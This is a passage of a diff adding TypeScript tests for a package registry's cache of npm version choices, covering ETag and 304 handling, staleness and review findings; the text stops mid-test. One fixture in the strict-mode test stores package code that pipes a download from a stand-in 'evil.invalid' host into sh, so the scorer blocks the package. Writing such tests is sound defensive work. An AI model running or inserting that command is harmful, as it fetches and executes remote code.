@@ -1,0 +1,961 @@
+// What a resolve keeps of each upstream package it reads (upstream_choices, migration 0021): the versions each choice
+// took, with npm's ETag for the packument. A later resolve asks npm with If-None-Match and, on a 304, answers from the
+// kept row without reading the packument. On 2026-11-15 a resolve of next read all 118 MB of its tree's packuments on
+// every request (17 to 22 s on production). npm is a local stand-in that sends an ETag and answers 304 as
+// registry.npmjs.org does; the store is the real Postgres one.
+import { describe, expect, spyOn, test } from "bun:test";
+import { createHash } from "node:crypto";
+import { Effect, Layer, Option } from "effect";
+import { Client } from "pg";
+import { z } from "zod";
+import { analyze, SCORER } from "@apm/core";
+import { freshDatabase } from "../../../tests/acceptance/postgres.ts";
+import { Analysis } from "../src/analysis.ts";
+import { resolveResponse, ResolveWait } from "../src/apm.ts";
+import { Blobs } from "../src/blobs.ts";
+import { Clock } from "../src/clock.ts";
+import { RegistryConfig } from "../src/config.ts";
+import { KEPT_CHOICES_INSERT_LOCK, Store, type StoreApi, type VersionRecord } from "../src/db.ts";
+import { digestLabel, digestOf } from "../src/digest.ts";
+import { ChoicesWriter, driverWriteBytes, keepPlans, KEPT_CHOICES_MAX_AGE_MS, KEPT_CHOICES_MAX_CHOICES, KEPT_CHOICES_MAX_TEXT, keptPlan, KeptSide, KEPT_TEXT_WEIGHTS, utf8Bytes } from "../src/kept-choices.ts";
+import { pageExists, summarize } from "../src/kept-package.ts";
+import { MemoryPool, RequestMemory, type Lease } from "../src/memory.ts";
+import { NPM_FAILURE_MS, Upstream } from "../src/upstream.ts";
+import { keptSummary } from "../src/walk-catalog.ts";
+
+const NOW = Date.parse("2026-11-12T00:00:00Z");
+const DAY = 86_400_000;
+const MINUTE = 60_000;
+const encoder = new TextEncoder();
+
+type Doc = { name: string; version: string; main: string; license: string; dependencies?: Record<string, string> };
+
+const integrityOf = (id: string): string => `sha512-${createHash("sha512").update(id).digest("base64")}`;
+
+/** npm, standing in: packuments with an ETag each, a 304 for a matching If-None-Match, and a switch to fail one. */
+function fakeNpm(initial: Record<string, Doc[]>) {
+  const docs = new Map(Object.entries(initial));
+  const failing = new Set<string>();
+  const seen = { bodies: 0, notModified: 0 };
+
+  const textOf = (name: string): string | null => {
+    const vs = docs.get(name);
+
+    if (!vs) return null;
+    const versions = Object.fromEntries(vs.map((d) => [d.version, { ...d, dist: { tarball: `https://npm.invalid/${name}/-/${name}-${d.version}.tgz`, shasum: "1".repeat(40), integrity: integrityOf(`${name}@${d.version}`) } }]));
+    const time = Object.fromEntries(vs.map((d, i) => [d.version, new Date(NOW - (20 - i) * DAY).toISOString()]));
+
+    return JSON.stringify({ name, "dist-tags": { latest: vs.at(-1)?.version ?? "" }, versions, time });
+  };
+
+  const server = Bun.serve({
+    port: 0,
+    hostname: "127.0.0.1",
+    fetch(req): Response {
+      const name = decodeURIComponent(new URL(req.url).pathname.slice(1));
+
+      if (failing.has(name)) return new Response("unavailable", { status: 503 });
+      const text = textOf(name);
+
+      if (text === null) return Response.json({ error: "Not found" }, { status: 404 });
+      const etag = `"${createHash("md5").update(text).digest("hex")}"`;
+
+      if (req.headers.get("if-none-match") === etag) {
+        seen.notModified++;
+
+        return new Response(null, { status: 304, headers: { etag } });
+      }
+
+      seen.bodies++;
+
+      return new Response(text, { headers: { "content-type": "application/json", etag } });
+    },
+  });
+
+  return { url: server.url.href, docs, failing, seen, stop: () => server.stop(true) };
+}
+
+const noBlobs = Layer.succeed(
+  Blobs,
+  Blobs.of({ put: () => Effect.void, stream: () => Effect.succeed(Option.none()), bytes: () => Effect.succeed(Option.none()), exists: () => Effect.succeed(false), remove: () => Effect.void }),
+);
+
+const Body = z
+  .object({
+    version: z.string().nullish(),
+    tree: z.object({ packages: z.array(z.object({ name: z.string(), version: z.string() })), blocks: z.array(z.object({ name: z.string() })), unavailable: z.array(z.object({ dependency: z.string() })) }).loose().optional(),
+    warnings: z.array(z.object({ name: z.string(), kind: z.string() })).optional(),
+  })
+  .loose();
+
+const settings = (npm: string) => ({ baseUrl: "http://registry.test/", webUrl: "http://web.test/", upstreamUrl: npm, legacyAuth: false, namePolicy: "open", admins: [] }) as const;
+
+/** A resolve of `name` (`range`, latest by default) at `at` (NOW by default) in a memory pool of its own, as a new isolate's. */
+async function resolve(input: { url: string; npm: string; name: string; strict?: boolean; at?: number; range?: string }) {
+  const params = new URLSearchParams({ name: input.name, range: input.range ?? "latest" });
+
+  if (input.strict) params.set("strict", "1");
+  const at = input.at ?? NOW;
+  const base = Layer.mergeAll(Store.postgres(input.url), Clock.fixed({ now: at, wallNow: at }), Analysis.none, noBlobs, Layer.succeed(ResolveWait, { maxMs: 0, pollMs: 1 }), Layer.succeed(RegistryConfig, settings(input.npm)), RequestMemory.layer(new MemoryPool()));
+  const layers = Layer.provideMerge(Upstream.layer(input.npm, 60_000, null), base);
+  const program = Effect.flatMap(resolveResponse(new URL(`http://registry.test/-/apm/v1/resolve?${params}`)), (res) => Effect.promise(async () => ({ status: res.status, text: await res.text() })));
+  const out = await Effect.runPromise(program.pipe(Effect.provide(layers), Effect.scoped));
+
+  return { status: out.status, text: out.text, body: Body.parse(JSON.parse(out.text)) };
+}
+
+function doc(name: string, version: string, dependencies?: Record<string, string>): Doc {
+  const d: Doc = { name, version, main: "index.js", license: "MIT" };
+
+  if (dependencies) d.dependencies = dependencies;
+
+  return d;
+}
+
+const TREE = { app: [doc("app", "1.0.0", { dep: "^1.0.0", risky: "^1.0.0" })], dep: [doc("dep", "1.0.0"), doc("dep", "2.0.0")], risky: [doc("risky", "1.0.0")] };
+
+async function withRig(fn: (rig: { url: string; npm: ReturnType<typeof fakeNpm>; sql: (q: string, p?: unknown[]) => Promise<unknown[]> }) => Promise<void>): Promise<void> {
+  const db = await freshDatabase();
+  const npm = fakeNpm(TREE);
+  const c = new Client({ connectionString: db.url });
+
+  await c.connect();
+
+  try {
+    await fn({ url: db.url, npm, sql: async (q, p = []) => (await c.query(q, p)).rows });
+  } finally {
+    await c.end();
+    npm.stop();
+    await db.drop();
+  }
+}
+
+/** Stores an analysis of `name@version`; with `code`, the code it read. */
+async function scored(sql: (q: string, p?: unknown[]) => Promise<unknown[]>, name: string, version: string, code = "module.exports = 1;\n"): Promise<void> {
+  const m = doc(name, version);
+  const file = (path: string, text: string) => ({ path, size: text.length, mode: 0o644, data: encoder.encode(text) });
+  const analysis = analyze({ name, manifest: m, files: [file("package.json", JSON.stringify(m)), file("index.js", code)], publisher: "u", previousPublishers: [] });
+  const d = digestOf({ integrity: integrityOf(`${name}@${version}`), shasum: "" });
+
+  if (!d) throw new Error("no digest");
+  await sql(`INSERT INTO upstream_analysis (package, version, digest, scorer, analysis, analyzed_at) VALUES ($1, $2, $3, $4, $5::jsonb, 0)`, [name, version, digestLabel(d), SCORER, JSON.stringify(analysis)]);
+}
+
+describe("kept choices: npm's 304 answers a resolve without its packuments", () => {
+  test("a second resolve reads no packument, and answers as the first did", () =>
+    withRig(async ({ url, npm, sql }) => {
+      for (const [n, v] of [["app", "1.0.0"], ["dep", "1.0.0"], ["risky", "1.0.0"]] as const) await scored(sql, n, v);
+      const first = await resolve({ url, npm: npm.url, name: "app" });
+      const bodies = npm.seen.bodies;
+      const second = await resolve({ url, npm: npm.url, name: "app" });
+
+      expect(first.status).toBe(200);
+      expect(first.body.tree?.packages).toEqual([
+        { name: "dep", version: "1.0.0" },
+        { name: "risky", version: "1.0.0" },
+      ]);
+      expect(npm.seen.bodies).toBe(bodies);
+      expect(npm.seen.notModified).toBeGreaterThanOrEqual(3);
+      expect(second.text).toBe(first.text);
+      // one row for each document npm was asked for: this upstream's URL of each package
+      expect(await sql(`SELECT document FROM upstream_choices ORDER BY document`)).toEqual(["app", "dep", "risky"].map((n) => ({ document: `${npm.url}${n}` })));
+    }));
+
+  test("a version npm publishes in range meanwhile is picked: its new ETag reads the packument again", () =>
+    withRig(async ({ url, npm }) => {
+      await resolve({ url, npm: npm.url, name: "app" });
+      npm.docs.set("dep", [doc("dep", "1.0.0"), doc("dep", "1.5.0"), doc("dep", "2.0.0")]);
+      const after = await resolve({ url, npm: npm.url, name: "app" });
+
+      expect(after.body.tree?.packages).toContainEqual({ name: "dep", version: "1.5.0" });
+    }));
+
+  test("npm failing for a dependency is unavailable, never answered from its kept row, which stays for later", () =>
+    withRig(async ({ url, npm, sql }) => {
+      const first = await resolve({ url, npm: npm.url, name: "app" });
+      const kept = await sql(`SELECT etag, kept FROM upstream_choices WHERE document = $1`, [`${npm.url}dep`]);
+      npm.failing.add("dep");
+      const down = await resolve({ url, npm: npm.url, name: "app", strict: true });
+
+      expect(down.status).toBe(503);
+      expect(down.body).toMatchObject({ unavailable: [{ dependency: "dep@^1.0.0" }] });
+      expect(await sql(`SELECT etag, kept FROM upstream_choices WHERE document = $1`, [`${npm.url}dep`])).toEqual(kept);
+      npm.failing.delete("dep");
+      // npm failed a small read for dep: for NPM_FAILURE_MS its reads go straight to the whole packument (package
+      // pages' failure mark), and the answer is the same
+      const bodies = npm.seen.bodies;
+      const marked = await resolve({ url, npm: npm.url, name: "app" });
+
+      expect(npm.seen.bodies - bodies).toBe(1);
+      expect(marked.text).toBe(first.text);
+      // past the mark, the kept row answers npm's 304 again
+      const wall = Date.now() + NPM_FAILURE_MS + 1_000;
+      const date = spyOn(Date, "now").mockImplementation(() => wall);
+
+      try {
+        const again = npm.seen.bodies;
+        const back = await resolve({ url, npm: npm.url, name: "app" });
+
+        expect(npm.seen.bodies).toBe(again);
+        expect(back.text).toBe(first.text);
+      } finally {
+        date.mockRestore();
+      }
+    }));
+
+  test("strict mode still refuses a low score answered from a kept row", () =>
+    withRig(async ({ url, npm, sql }) => {
+      await scored(sql, "app", "1.0.0");
+      await scored(sql, "dep", "1.0.0");
+      await scored(sql, "risky", "1.0.0", "require('child_process').execSync('curl https://evil.invalid/x.sh | sh');\n");
+      const first = await resolve({ url, npm: npm.url, name: "app", strict: true });
+      const bodies = npm.seen.bodies;
+      const second = await resolve({ url, npm: npm.url, name: "app", strict: true });
+
+      expect(first.status).toBe(422);
+      expect(first.body.tree?.blocks.map((b) => b.name)).toEqual(["risky"]);
+      expect(npm.seen.bodies).toBe(bodies);
+      expect(second.status).toBe(422);
+      expect(second.text).toBe(first.text);
+    }));
+
+  test("a choice past its hour is not answered from: the packument is read whole again, and the choice made anew", () =>
+    withRig(async ({ url, npm, sql }) => {
+      const first = await resolve({ url, npm: npm.url, name: "app" });
+      const bodies = npm.seen.bodies;
+      const again = await resolve({ url, npm: npm.url, name: "app", at: NOW + 60 * MINUTE });
+      // every choice was made at NOW, so an hour on none of them answers
+      const times = z.array(z.object({ at: z.coerce.number() })).parse(await sql(`SELECT (l.value->>'at')::bigint AS at FROM upstream_choices, jsonb_each(kept->'lists') AS l`));
+
+      expect(npm.seen.bodies - bodies).toBe(3);
+      expect(again.text).toBe(first.text);
+      expect(times.length).toBeGreaterThan(0);
+      expect(times.every((x) => x.at === NOW + 60 * MINUTE)).toBe(true);
+    }));
+
+  test("the table holds no more rows than its capacity, and a full table still replaces a row it has", () =>
+    withRig(async ({ url, sql }) => {
+      const kept = (n: string) => ({ document: n, etag: `"${n}"`, text: JSON.stringify({ distTags: {}, lists: {}, records: {} }) });
+      const run = <A>(f: Effect.Effect<A, unknown, Store>) => Effect.runPromise(f.pipe(Effect.provide(Store.postgres(url)), Effect.scoped));
+
+      await run(Effect.flatMap(Store, (s) => s.keepChoices({ rows: [kept("a"), kept("b"), kept("c")], at: 1, capacity: 2, maxBytes: KEPT_CHOICES_MAX_TEXT, maxChoices: KEPT_CHOICES_MAX_CHOICES, maxAgeMs: KEPT_CHOICES_MAX_AGE_MS })));
+      expect(await sql(`SELECT count(*)::int AS n FROM upstream_choices`)).toEqual([{ n: 2 }]);
+      await run(Effect.flatMap(Store, (s) => s.keepChoices({ rows: [{ ...kept("a"), etag: `"a2"` }, kept("d")], at: 2, capacity: 2, maxBytes: KEPT_CHOICES_MAX_TEXT, maxChoices: KEPT_CHOICES_MAX_CHOICES, maxAgeMs: KEPT_CHOICES_MAX_AGE_MS })));
+      expect(await sql(`SELECT document, etag FROM upstream_choices ORDER BY document`)).toEqual([
+        { document: "a", etag: `"a2"` },
+        { document: "b", etag: `"b"` },
+      ]);
+      // a row past maxBytes as stored is never kept, nor does it replace one
+      await run(Effect.flatMap(Store, (s) => s.keepChoices({ rows: [{ document: "a", etag: `"a3"`, text: JSON.stringify({ distTags: { big: "x".repeat(200) }, lists: {}, records: {} }) }], at: 3, capacity: 2, maxBytes: 100, maxChoices: KEPT_CHOICES_MAX_CHOICES, maxAgeMs: KEPT_CHOICES_MAX_AGE_MS })));
+      expect(await sql(`SELECT etag FROM upstream_choices WHERE document = 'a'`)).toEqual([{ etag: `"a2"` }]);
+      // a read is sent no more rows than its allowance holds
+      const rows = await run(Effect.flatMap(Store, (s) => s.keptChoicesOf({ documents: ["a", "b"], allowance: 1, weights: KEPT_TEXT_WEIGHTS, at: 3 })));
+      expect(rows).toEqual([]);
+      const both = await run(Effect.flatMap(Store, (s) => s.keptChoicesOf({ documents: ["a", "b"], allowance: 1_000_000, weights: KEPT_TEXT_WEIGHTS, at: 3 })));
+      expect(both.map((r) => r.document)).toEqual(["a", "b"]);
+    }));
+});
+
+// Review of 3aacc2a: seven P2 findings, the first six here; each of these failed on 3aacc2a.
+describe("kept choices: review of 3aacc2a", () => {
+  /** An npm that answers every package with one version and always the same ETag, and 304 for it. */
+  const fixedEtagNpm = (version: () => string) =>
+    Bun.serve({
+      port: 0,
+      hostname: "127.0.0.1",
+      fetch: (req) => {
+        if (req.headers.get("if-none-match") === `"fixed"`) return new Response(null, { status: 304, headers: { etag: `"fixed"` } });
+        const v = version();
+        const dist = { tarball: "https://npm.invalid/app.tgz", shasum: "1".repeat(40), integrity: integrityOf(`app@${v}`) };
+
+        return Response.json({ name: "app", "dist-tags": { latest: v }, versions: { [v]: { ...doc("app", v), dist } }, time: { [v]: new Date(NOW - 10 * DAY).toISOString() } }, { headers: { etag: `"fixed"` } });
+      },
+    });
+
+  test("finding 1: a row kept for one upstream never answers another's 304, though both send the same ETag", async () => {
+    const db = await freshDatabase();
+    const a = fixedEtagNpm(() => "1.0.0");
+    const b = fixedEtagNpm(() => "2.0.0");
+
+    try {
+      const first = await resolve({ url: db.url, npm: a.url.href, name: "app" });
+      const second = await resolve({ url: db.url, npm: b.url.href, name: "app" });
+
+      expect(first.body.version).toBe("1.0.0");
+      // on 3aacc2a: 1.0.0, upstream a's choice, answered for upstream b's 304
+      expect(second.body.version).toBe("2.0.0");
+    } finally {
+      await a.stop(true);
+      await b.stop(true);
+      await db.drop();
+    }
+  });
+
+  test("finding 2: a whole read under the same ETag does not make an older choice young again", async () => {
+    const db = await freshDatabase();
+    let version = "1.0.0";
+    const npm = fixedEtagNpm(() => version);
+    const HOUR = 60 * 60_000;
+
+    try {
+      expect((await resolve({ url: db.url, npm: npm.url.href, name: "app" })).body.version).toBe("1.0.0");
+      // a mirror that keeps its ETag while its packument changes
+      version = "2.0.0";
+      // a whole read for another choice, past the first choice's hour
+      expect((await resolve({ url: db.url, npm: npm.url.href, name: "app", range: "*", at: NOW + HOUR + MINUTE })).body.version).toBe("2.0.0");
+      // on 3aacc2a: 1.0.0 again, the first choice answered from the row the whole read made young
+      expect((await resolve({ url: db.url, npm: npm.url.href, name: "app", at: NOW + HOUR + 2 * MINUTE })).body.version).toBe("2.0.0");
+    } finally {
+      await npm.stop(true);
+      await db.drop();
+    }
+  });
+
+  test("finding 3: keeping choices never costs the answer: chosen finds what summaries finds under the same lease", () =>
+    withRig(async ({ url, npm, sql }) => {
+      npm.docs.set("app", [Object.assign(doc("app", "1.0.0"), { scripts: { install: "x".repeat(4000) } })]);
+      const pool = new MemoryPool();
+      const layers = Layer.provideMerge(Upstream.layer(npm.url, 60_000, null), Layer.mergeAll(Store.postgres(url), Clock.fixed({ now: NOW, wallNow: NOW }), noBlobs, Layer.succeed(RegistryConfig, settings(npm.url))));
+
+      const read = async (how: "chosen" | "summaries", limit: number) => {
+        const lease = pool.request(limit);
+
+        try {
+          const program = Effect.flatMap(Upstream, (up) =>
+            how === "chosen"
+              ? up.chosen({ names: ["app"], lease, choices: () => [{ key: "all", choose: (pkg) => pkg.versions }], keep: (c, r) => keptSummary({ kind: "upstream", name: c.name, distTags: c.distTags, versions: [...(c.versions.get("all") ?? [])] }, r) })
+              : up.summaries(["app"], lease, (pkg, r) => keptSummary({ kind: "upstream", name: pkg.name, distTags: pkg.distTags, versions: pkg.versions }, r)),
+          );
+
+          return (await Effect.runPromise(program.pipe(Effect.provide(layers), Effect.provideService(RequestMemory, lease), Effect.scoped))).get("app")?.kind;
+        } finally {
+          lease.release();
+        }
+      };
+
+      // warm: the isolate cache has the package
+      await read("summaries", 1_000_000);
+      const lost: number[] = [];
+
+      for (const limit of [15_000, 20_000, 25_000, 30_000, 35_000, 40_000]) {
+        await sql(`DELETE FROM upstream_choices`);
+        const plain = await read("summaries", limit);
+        const kept = await read("chosen", limit);
+
+        if (plain === "found" && kept !== "found") lost.push(limit);
+      }
+
+      // on 3aacc2a: [20000, 25000, 30000, 35000], the row's pending write taking the answer's room
+      expect(lost).toEqual([]);
+    }));
+
+  test("finding 4: a row's text is never built before what it holds is reserved", () => {
+    const pool = new MemoryPool();
+    const lease = pool.request(1024);
+    const original = JSON.stringify.bind(JSON);
+    const unreserved: number[] = [];
+
+    // every serialization while a row is planned is checked: what the pool holds must cover it, at two bytes a character
+    const spy = spyOn(JSON, "stringify").mockImplementation((value) => {
+      const text = original(value);
+
+      if (pool.charged < 2 * text.length) unreserved.push(text.length);
+
+      return text;
+    });
+
+    try {
+      const plan = (distTags: Record<string, string>, on: Lease) => keptPlan({ document: "http://npm.test/app", etag: `"v1"`, distTags, versions: new Map(), reserve: on, at: NOW });
+
+      expect(plan({ latest: "1.0.0", huge: "x".repeat(70_000) }, lease)).toBeNull();
+      // on 3aacc2a: one 70,065-character text built with nothing reserved
+      expect(unreserved).toEqual([]);
+      expect(lease.taken).toBe(0);
+      // dist-tags under the cap that do not fit the lease: refused before the text is built
+      expect(plan({ latest: "1.0.0", big: "x".repeat(20_000) }, lease)).toBeNull();
+      expect(unreserved).toEqual([]);
+      expect(lease.taken).toBe(0);
+      // and with room, built under its reservation, which settles to the plan's one charge: at least its UTF-8 bytes
+      const roomy = pool.request();
+      const kept = plan({ latest: "1.0.0", big: "x".repeat(20_000) }, roomy);
+
+      expect(unreserved).toEqual([]);
+      expect(kept?.text.length).toBeGreaterThan(20_000);
+      expect(roomy.taken).toBe(kept?.weight ?? -1);
+      expect(kept?.weight ?? 0).toBeGreaterThanOrEqual(utf8Bytes(kept?.text ?? ""));
+      roomy.release();
+    } finally {
+      spy.mockRestore();
+      lease.release();
+    }
+  });
+
+  test("finding 5: no write keeps more than the cap of choices, even all from one read", () =>
+    withRig(async ({ url, npm, sql }) => {
+      const dependencies = Object.fromEntries(Array.from({ length: KEPT_CHOICES_MAX_CHOICES + 1 }, (_, i) => [`alias${i}`, `npm:dep@>=1.0.0 <${i + 2}.0.0`]));
+      npm.docs.set("app", [doc("app", "1.0.0", dependencies)]);
+      const answer = await resolve({ url, npm: npm.url, name: "app" });
+      const most = await sql(`SELECT coalesce(max((SELECT count(*) FROM jsonb_object_keys(kept->'lists'))), 0)::int AS n FROM upstream_choices`);
+
+      expect(answer.status).toBe(200);
+      // on 3aacc2a: 17
+      expect(z.array(z.object({ n: z.number() })).parse(most)[0]?.n ?? 0).toBeLessThanOrEqual(KEPT_CHOICES_MAX_CHOICES);
+    }));
+
+  test("finding 6: the row cap counts the bytes Postgres stores, not UTF-16 units", () =>
+    withRig(async ({ url, npm, sql }) => {
+      npm.docs.set("app", [Object.assign(doc("app", "1.0.0"), { scripts: { install: "漢".repeat(23_000) } })]);
+      const answer = await resolve({ url, npm: npm.url, name: "app" });
+      const biggest = await sql(`SELECT coalesce(max(octet_length(kept::text)), 0)::int AS bytes FROM upstream_choices`);
+
+      expect(answer.status).toBe(200);
+      // on 3aacc2a: 69,677 bytes kept
+      expect(z.array(z.object({ bytes: z.number() })).parse(biggest)[0]?.bytes ?? 0).toBeLessThanOrEqual(KEPT_CHOICES_MAX_TEXT);
+    }));
+});
+
+// Re-check of 3366a36: each of these failed on 3366a36.
+describe("kept choices: re-check of 3366a36", () => {
+  /** Upstream.chosen against Upstream.summaries for `names`, each keeping every version, under a request lease of `limit`. */
+  const reader = (url: string, npmUrl: string, names: readonly string[], at: () => number = () => NOW) => {
+    const pool = new MemoryPool();
+    const layers = (now: number) => Layer.provideMerge(Upstream.layer(npmUrl, 60_000, null), Layer.mergeAll(Store.postgres(url), Clock.fixed({ now, wallNow: now }), noBlobs, Layer.succeed(RegistryConfig, settings(npmUrl))));
+
+    return async (how: "chosen" | "summaries", limit: number, key = "all"): Promise<number> => {
+      const lease = pool.request(limit);
+
+      try {
+        const program = Effect.flatMap(Upstream, (up) =>
+          how === "chosen"
+            ? up.chosen({ names, lease, choices: () => [{ key, choose: (pkg) => pkg.versions }], keep: (c, r) => keptSummary({ kind: "upstream", name: c.name, distTags: c.distTags, versions: [...(c.versions.get(key) ?? [])] }, r) })
+            : up.summaries(names, lease, (pkg, r) => keptSummary({ kind: "upstream", name: pkg.name, distTags: pkg.distTags, versions: pkg.versions }, r)),
+        );
+
+        const out = await Effect.runPromise(program.pipe(Effect.provide(layers(at())), Effect.provideService(RequestMemory, lease), Effect.scoped));
+
+        return [...out.values()].filter((s) => s.kind === "found").length;
+      } finally {
+        lease.release();
+      }
+    };
+  };
+
+  test("finding 1: chosen finds every package summaries finds, at every lease, with no rows and with rows kept", () =>
+    withRig(async ({ url, npm, sql }) => {
+      const names = Array.from({ length: 8 }, (_, i) => `pkg${i}`);
+
+      for (const n of names) npm.docs.set(n, [Object.assign(doc(n, "1.0.0"), { scripts: { install: "x".repeat(4000) } })]);
+      const read = reader(url, npm.url, names);
+      // warm: the isolate cache has every package
+      await read("summaries", 1_000_000);
+      const lost: { limit: number; rows: boolean; plain: number; kept: number }[] = [];
+
+      for (const rows of [false, true]) {
+        for (const limit of [15_000, 20_000, 25_000, 30_000, 35_000, 40_000, 45_000, 50_000, 55_000, 60_000, 65_000, 70_000, 80_000, 90_000, 100_000, 120_000]) {
+          if (!rows) await sql(`DELETE FROM upstream_choices`);
+          const plain = await read("summaries", limit);
+          const kept = await read("chosen", limit);
+
+          if (kept < plain) lost.push({ limit, rows, plain, kept });
+        }
+
+        // rows for every package, for the sweep with rows kept
+        await read("chosen", 1_000_000);
+      }
+
+      // on 3366a36: 8 found by summaries and 5 by chosen at 90 KB, and a kept row denying a warm package at 25 to 40 KB
+      expect(lost).toEqual([]);
+    }));
+
+  test("finding 2: a choice made from the isolate cache is as old as the whole read it came from", () =>
+    withRig(async ({ url, npm, sql }) => {
+      let wall = NOW;
+      const date = spyOn(Date, "now").mockImplementation(() => wall);
+
+      try {
+        const shared = reader(url, npm.url, ["app"], () => wall);
+        wall = NOW;
+        await shared("chosen", 1_000_000, "a");
+        // 59 s on, from the isolate cache: no read of npm
+        wall = NOW + 59_000;
+        await shared("chosen", 1_000_000, "b");
+        expect(npm.seen.bodies).toBe(1);
+        // an hour after the only whole read, in a new isolate: choice b is that read's, so it no longer answers
+        wall = NOW + 60 * MINUTE + 30_000;
+        await reader(url, npm.url, ["app"], () => wall)("chosen", 1_000_000, "b");
+        const lists = z.array(z.object({ at: z.coerce.number() })).parse(await sql(`SELECT (l.value->>'at')::bigint AS at FROM upstream_choices, jsonb_each(kept->'lists') AS l WHERE l.key = 'b'`));
+
+        // on 3366a36: 1 body, choice b stamped 59 s after the read and answered from a 304
+        expect(npm.seen.bodies).toBe(2);
+        expect(lists).toEqual([{ at: NOW + 60 * MINUTE + 30_000 }]);
+      } finally {
+        date.mockRestore();
+      }
+    }));
+
+  test("finding 3: a weak ETag keeps nothing, so every resolve reads the packument whole", async () => {
+    const db = await freshDatabase();
+    let bodies = 0;
+
+    const npm = Bun.serve({
+      port: 0,
+      hostname: "127.0.0.1",
+      fetch: (req) => {
+        if (req.headers.get("if-none-match") === `W/"weak"`) return new Response(null, { status: 304, headers: { etag: `W/"weak"` } });
+        bodies++;
+        const dist = { tarball: "https://npm.invalid/app.tgz", shasum: "1".repeat(40), integrity: integrityOf("app@1.0.0") };
+
+        return Response.json({ name: "app", "dist-tags": { latest: "1.0.0" }, versions: { "1.0.0": { ...doc("app", "1.0.0"), dist } }, time: { "1.0.0": new Date(NOW - 10 * DAY).toISOString() } }, { headers: { etag: `W/"weak"` } });
+      },
+    });
+
+    const c = new Client({ connectionString: db.url });
+
+    try {
+      await resolve({ url: db.url, npm: npm.url.href, name: "app" });
+      await resolve({ url: db.url, npm: npm.url.href, name: "app" });
+      await c.connect();
+
+      // on 3366a36: one row kept for W/"weak", and the second resolve answered from its 304
+      expect((await c.query(`SELECT count(*)::int AS n FROM upstream_choices`)).rows).toEqual([{ n: 0 }]);
+      expect(bodies).toBe(2);
+    } finally {
+      await c.end();
+      await npm.stop(true);
+      await db.drop();
+    }
+  });
+
+  test("finding 4: a packument npm redirects is read whole every time, never validated against another document's row", async () => {
+    const db = await freshDatabase();
+    let target = "one";
+
+    const npm = Bun.serve({
+      port: 0,
+      hostname: "127.0.0.1",
+      fetch: (req) => {
+        const path = new URL(req.url).pathname;
+
+        if (path.startsWith("/front/")) return new Response(null, { status: 302, headers: { location: `/${target}/app` } });
+
+        if (req.headers.get("if-none-match") === `"local-revision-1"`) return new Response(null, { status: 304, headers: { etag: `"local-revision-1"` } });
+        const version = path.startsWith("/one/") ? "1.0.0" : "2.0.0";
+        const dist = { tarball: "https://npm.invalid/app.tgz", shasum: "1".repeat(40), integrity: integrityOf(`app@${version}`) };
+
+        return Response.json({ name: "app", "dist-tags": { latest: version }, versions: { [version]: { ...doc("app", version), dist } }, time: { [version]: new Date(NOW - 10 * DAY).toISOString() } }, { headers: { etag: `"local-revision-1"` } });
+      },
+    });
+
+    const c = new Client({ connectionString: db.url });
+
+    try {
+      const first = await resolve({ url: db.url, npm: `${npm.url.href}front/`, name: "app" });
+      target = "two";
+      const second = await resolve({ url: db.url, npm: `${npm.url.href}front/`, name: "app", at: NOW + MINUTE });
+      await c.connect();
+
+      expect(first.body.version).toBe("1.0.0");
+      // on 3366a36: 1.0.0, /one/app's row answering for /two/app's 304
+      expect(second.body.version).toBe("2.0.0");
+      // a row is kept only for a document that answered directly
+      expect((await c.query(`SELECT count(*)::int AS n FROM upstream_choices`)).rows).toEqual([{ n: 0 }]);
+    } finally {
+      await c.end();
+      await npm.stop(true);
+      await db.drop();
+    }
+  });
+});
+
+// Combined review of 67d8658 (climb/resolve-speed-main): each of these failed on 67d8658.
+describe("kept choices and kept summaries: combined review of 67d8658", () => {
+  /** A one-version packument of `name` as npm sends it, its ETag `etag`. */
+  const packumentOf = (name: string, version: string) => {
+    const dist = { tarball: `https://npm.invalid/${name}.tgz`, shasum: "1".repeat(40), integrity: integrityOf(`${name}@${version}`) };
+
+    return { name, "dist-tags": { latest: version }, versions: { [version]: { ...doc(name, version), dist } }, time: { [version]: new Date(NOW - 10 * DAY).toISOString() } };
+  };
+
+  test("finding 2: a stale summary's check that failed is not tried again by its caller: 2 requests, then 1 while the mark lasts, as on 03be2c3", async () => {
+    const db = await freshDatabase();
+    let wall = NOW;
+    const date = spyOn(Date, "now").mockImplementation(() => wall);
+    let down = false;
+    const asked: string[] = [];
+
+    const npm = Bun.serve({
+      port: 0,
+      hostname: "127.0.0.1",
+      fetch: (req) => {
+        asked.push(req.headers.has("if-none-match") ? "conditional" : "whole");
+
+        if (down) return new Response("down", { status: 503 });
+
+        return Response.json(packumentOf("app", "1.0.0"), { headers: { etag: `"1.0.0"` } });
+      },
+    });
+
+    const c = new Client({ connectionString: db.url });
+    const pool = new MemoryPool();
+
+    const run = <A>(f: Effect.Effect<A, unknown, Upstream | Store | Clock | RequestMemory>) =>
+      Effect.runPromise(f.pipe(Effect.provide(Layer.provideMerge(Upstream.layer(npm.url.href, 60_000, null), Layer.mergeAll(Store.postgres(db.url), noBlobs, Clock.fixed({ now: wall, wallNow: wall }), RequestMemory.layer(pool)))), Effect.scoped));
+
+    try {
+      await c.connect();
+      const first = await run(Effect.flatMap(Upstream, (u) => Effect.flatMap(RequestMemory, (lease) => u.listing("app", lease))));
+
+      if (first.kind !== "found") throw new Error("no package");
+      await c.query(`INSERT INTO kept_packages (package, summary, computed_at, asked_at) VALUES ($1, $2::jsonb, $3, $3)`, ["app", JSON.stringify(summarize(first.pkg)), wall - 5 * MINUTE - 1]);
+      // past the isolate cache's TTL, npm down
+      down = true;
+      wall += 61_000;
+      const counts: number[] = [];
+
+      for (let i = 0; i < 2; i++) {
+        const before = asked.length;
+        const got = await run(Effect.flatMap(Upstream, (u) => Effect.flatMap(RequestMemory, (lease) => pageExists({ upstream: u, name: "app", lease }))));
+
+        expect(got).toBe("unknown");
+        counts.push(asked.length - before);
+      }
+
+      // on 67d8658: [3, 2]; on 03be2c3 a HEAD and a whole read, then a whole read while marked
+      expect(counts).toEqual([2, 1]);
+    } finally {
+      date.mockRestore();
+      await c.end();
+      await npm.stop(true);
+      await db.drop();
+    }
+  });
+
+  test("finding 3: a conditional read whose 200 cannot be read marks the package, so the next small read does not ask npm", async () => {
+    const counts = { conditional: 0, version: 0 };
+
+    const npm = Bun.serve({
+      port: 0,
+      hostname: "127.0.0.1",
+      fetch: (req) => {
+        if (new URL(req.url).pathname.endsWith("/1.0.0")) {
+          counts.version++;
+
+          return Response.json({ dist: { tarball: "https://npm.invalid/a.tgz", shasum: "1".repeat(40) } });
+        }
+
+        if (req.headers.has("if-none-match")) counts.conditional++;
+
